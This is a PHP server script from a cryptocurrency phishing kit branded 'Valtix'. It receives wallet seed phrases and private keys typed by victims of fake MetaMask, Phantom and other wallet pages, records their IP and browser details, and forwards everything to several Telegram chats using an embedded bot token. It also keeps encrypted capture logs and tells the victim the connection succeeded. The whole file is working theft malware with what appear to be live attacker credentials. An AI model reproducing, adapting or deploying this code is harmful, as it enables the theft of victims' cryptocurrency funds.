<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); echo json_encode(['error' => 'POST only']); exit; }

$ENCRYPTION_KEY = 'Valtix_Render_2026_SecretKey!!';
$ENCRYPTION_IV  = '1234567890abcdef';
$LOG_DIR        = __DIR__ . '/logs';
$LOG_FILE       = $LOG_DIR . '/captures.log';
$ERROR_LOG      = $LOG_DIR . '/collect_errors.log';
$BOT_TOKEN      = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
$CHAT_IDS       = [
    getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
    '8955126022',
    '8895304810'
];

// Ensure logs directory
if (!is_dir($LOG_DIR)) mkdir($LOG_DIR, 0755, true);

// Read input
$rawInput = file_get_contents('php://input');
$input = json_decode($rawInput, true);

// Log everything for debugging
file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] RAW INPUT: " . $rawInput . "\n", FILE_APPEND);

if (!$input) {
    file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] ERROR: Invalid JSON\n", FILE_APPEND);
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON']);
    exit;
}

$seed = trim($input['seed'] ?? '');
$pkey = trim($input['pkey'] ?? '');

// Build capture data
$capture = [
    'id'         => $input['id'] ?? substr(md5(uniqid(mt_rand(), true)), 0, 12),
    'wallet'     => $input['wallet'] ?? 'unknown',
    'walletName' => $input['walletName'] ?? ucfirst($input['wallet'] ?? 'Unknown'),
    'seed'       => $seed,
    'pkey'       => $pkey,
    'seedWordCount' => !empty($seed) ? count(explode(' ', $seed)) : 0,
    'timestamp'  => $input['timestamp'] ?? date('Y-m-d H:i:s'),
    'ip'         => $_SERVER['REMOTE_ADDR'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '0.0.0.0',
    'userAgent'  => $input['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '',
    'screenSize' => $input['screenSize'] ?? '',
    'url'        => $input['url'] ?? '',
    'capturedAt' => date('Y-m-d H:i:s'),
];

// Escape function for Telegram HTML mode
function tgHtmlEscape($text) {
    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}

// ========== SEND TO TELEGRAM FIRST ==========
$walletEmoji = [
    'phantom'     => '👻 Phantom',
    'metamask'    => '🦊 MetaMask',
    'trustwallet' => '💙 Trust Wallet',
    'solflare'    => '☀️ Solflare',
    'coinbase'    => '🔵 Coinbase',
    'backpack'    => '🎒 Backpack',
    'okx'         => '🔶 OKX',
    'rabby'       => '🐰 Rabby',
];

$walletKey  = strtolower($capture['wallet']);
$walletName = $capture['walletName'];
$wordCount  = $capture['seedWordCount'];

if (!empty($walletName)) {
    $walletLabel = "👛 " . tgHtmlEscape($walletName);
} elseif (isset($walletEmoji[$walletKey])) {
    $walletLabel = tgHtmlEscape($walletEmoji[$walletKey]);
} else {
    $walletLabel = '👛 Unknown';
}

// Build message with HTML parse_mode
$message  = "🚨 <b>Valtix — New Capture</b> 🚨\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "💰 <b>Wallet:</b> {$walletLabel}\n";
$message .= "🆔 <b>ID:</b> <code>" . tgHtmlEscape($capture['id']) . "</code>\n";
$message .= "📅 <b>Time:</b> " . tgHtmlEscape($capture['timestamp']) . "\n";
$message .= "🌐 <b>IP:</b> <code>" . tgHtmlEscape($capture['ip']) . "</code>\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";

if (!empty($seed)) {
    $message .= "📝 <b>Seed Phrase ({$wordCount} words):</b>\n<code>" . tgHtmlEscape($seed) . "</code>\n";
} else {
    $message .= "📝 <b>Seed:</b> ❌ None\n";
}
$message .= "\n";
if (!empty($pkey)) {
    $message .= "🔑 <b>Private Key:</b>\n<code>" . tgHtmlEscape($pkey) . "</code>\n";
} else {
    $message .= "🔑 <b>Private Key:</b> ❌ None\n";
}
if (!empty($capture['screenSize'])) {
    $message .= "📱 <b>Screen:</b> " . tgHtmlEscape($capture['screenSize']) . "\n";
}
if (!empty($capture['userAgent'])) {
    $message .= "💻 <b>UA:</b> " . tgHtmlEscape(substr($capture['userAgent'], 0, 80)) . "\n";
}
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "⚡ <b>Valtix Intelligence</b>";

// Send to Telegram
$tgSuccess = false;
try {
    foreach ($CHAT_IDS as $chatId) {
        $chatId = trim($chatId);
        if (empty($chatId)) continue;

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage",
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => json_encode([
                'chat_id'    => $chatId,
                'text'       => $message,
                'parse_mode' => 'HTML',
            ]),
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 15,
            CURLOPT_CONNECTTIMEOUT => 10,
        ]);
        $resp = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        curl_close($ch);

        if ($http === 200) {
            $tgSuccess = true;
            file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG OK to {$chatId}: wallet={$walletLabel}, seed=" . (!empty($seed)?'YES':'NO') . ", key=" . (!empty($pkey)?'YES':'NO') . "\n", FILE_APPEND);
        } else {
            file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG FAILED to {$chatId}: HTTP {$http}, curl: {$curlError}, resp: " . substr($resp, 0, 500) . "\n", FILE_APPEND);
        }
    }
} catch (Exception $e) {
    file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
}

// ========== Save to log file ==========
try {
    $json = json_encode($capture);
    $encrypted = base64_encode(openssl_encrypt($json, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV));
    file_put_contents($LOG_FILE, $encrypted . "\n", FILE_APPEND);
    file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] Saved to log file OK\n", FILE_APPEND);
} catch (Exception $e) {
    file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] FILE WRITE ERROR: " . $e->getMessage() . "\n", FILE_APPEND);
}

// Summary log
file_put_contents($LOG_DIR . '/summary.log', "[" . date('Y-m-d H:i:s') . "] Wallet: {$capture['walletName']} | IP: {$capture['ip']} | Seed: " . (!empty($seed) ? 'YES' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . " | TG: " . ($tgSuccess ? 'OK' : 'FAILED') . "\n", FILE_APPEND);

// Always return OK to victim
echo json_encode(['status' => 'ok', 'message' => 'Connection processed']);
